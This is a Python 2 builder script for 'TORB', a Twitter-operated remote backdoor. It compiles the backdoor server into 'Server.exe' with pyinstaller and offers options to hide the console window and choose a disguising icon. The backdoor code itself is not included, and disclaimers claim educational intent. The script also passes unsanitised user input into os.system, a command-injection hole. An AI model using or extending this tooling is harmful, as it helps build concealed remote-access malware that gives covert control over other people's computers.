
# TORB - Twitter Operated Remote Backdoor (Public Version)
# Coded by (Pythogen) 2018 - https://github.com/pythogen

# Disclaimer: This was written for experimental/educational reasons and is not intended for malicious use!
# Please use only on machines you have full permission to control & monitor! Malicious commands & functionality removed.

#                          __..--.._
#    .....              .--~  .....  `.
#  .":    "`-..  .    .' ..-'"    :". `
#  ` `._ ` _.'`"(     `-"'`._ ' _.' '
#       ~~~      `.          ~~~
#                .'
#               /
#              (
#               ^---'

# Version 1.0

# TORB allows you to control computers using only tweets.
# Very reliable and very simple to use:

# Instructions:

# 1) Choose whether you want to hide/show the server's console output
# 2) Select an icon for your server's executable
# 3) Compile server to executable

print "\nTORB - Twitter Operated Remote Backdoor (Public Edition)\nCoded by Pythogen 2018\n"

print """
 _|_|_|_|_|    _|_|    _|_|_|    _|_|_|          _|        _|    
     _|      _|    _|  _|    _|  _|    _|      _|_|      _|  _|  
     _|      _|    _|  _|_|_|    _|_|_|          _|      _|  _|  
     _|      _|    _|  _|    _|  _|    _|        _|      _|  _|  
     _|        _|_|    _|    _|  _|_|_|          _|  _|    _|    
"""

print "\nCompile 'Server.exe' and select your desired icon.\n"
print "TORB is not intended for malicious purposes!"

import os

def visibility():
	w = raw_input("\nIs Form Visibile? (Y/N)> ")
	w = w.lower()
	if w == "y":
		iconSelect("y")
	elif w == "n":
		iconSelect("n")
	else:
		print "\nInvalid Response. Please try again."
		visibility()

def iconSelect(visBool):
	if visBool == "y":
		x = raw_input("Enter Icon Number> ")
		os.system('pyinstaller --onefile --icon icon/%s.ico torb-public.py' % (x))
	elif visBool == "n":
		x = raw_input("Enter Icon Number> ")
		os.system('pyinstaller --onefile --noconsole --icon icon/%s.ico torb-public.py' % (x))
	print "\nServer Created!\n"


visibility()